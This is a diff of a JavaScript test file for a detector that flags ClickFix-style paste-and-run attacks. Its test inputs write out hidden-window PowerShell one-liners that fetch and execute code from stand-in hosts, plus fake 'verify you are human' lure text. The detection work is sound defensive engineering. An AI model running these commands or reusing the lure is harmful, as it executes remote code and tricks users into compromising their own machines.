@@ -103,9 +103,10 @@ describe('AMSI / ETW / Defender tampering', () => {
 })
 
 describe('ClickFix / paste-and-run', () => {
-  it('fires on a hidden-window one-liner that fetches and IEXes', () => {
+  it('fires on a hidden-window one-liner carrying a fake-verification lure that fetches and IEXes', () => {
     const raw = "powershell -nop -w hidden -c IEX (iwr http://evil.test/x).Content"
-    expect(ids('IEX (iwr http://evil.test/x).Content', raw)).toContain('clickfix')
+    const text = "verify you are human, then paste this to continue: IEX (iwr http://evil.test/x).Content"
+    expect(ids(text, raw)).toContain('clickfix')
   })
   it('fires on conhost --headless powershell', () => {
     expect(ids("conhost --headless powershell -nop -c iex(irm http://x.test/a)"))
@@ -128,6 +129,29 @@ describe('ClickFix / paste-and-run', () => {
   })
   it('benign twin: gpg --verify (routine signature verification) does NOT fire — a bare --verify needs real ClickFix context', () => {
     expect(ids('gpg --verify sig.asc release.tar')).not.toContain('clickfix')
+  })
+})
+
+describe('ClickFix trait-gating (review 2.4)', () => {
+  it('a plain -enc/-nop/-w download cradle is NOT ClickFix', () => {
+    expect(sig("powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x/a')")).not.toContain('clickfix')
+  })
+  // The above uses sig(), which never runs preprocess() and so never
+  // populates ctx.flags — it can't exercise the -w/-nop-flag path at all.
+  // This one drives that path for real via ids()/preprocess(), which is the
+  // actual over-fire the review reported: a hidden -nop -w cradle with no
+  // lure must read as download-cradle only, never clickfix.
+  it('a real hidden -nop -w cradle (flags via preprocess, no lure) reads as download-cradle only, not ClickFix', () => {
+    const raw = "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    const text = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    expect(ids(text, raw)).toContain('download-cradle')
+    expect(ids(text, raw)).not.toContain('clickfix')
+  })
+  it('a real fake-CAPTCHA lure IS ClickFix', () => {
+    expect(sig("# verify you are human, press win+r\npowershell -nop -w hidden IEX (iwr http://x/a)")).toContain('clickfix')
+  })
+  it('conhost --headless still fires ClickFix', () => {
+    expect(sig('conhost --headless powershell -enc AAAA')).toContain('clickfix')
   })
 })
 
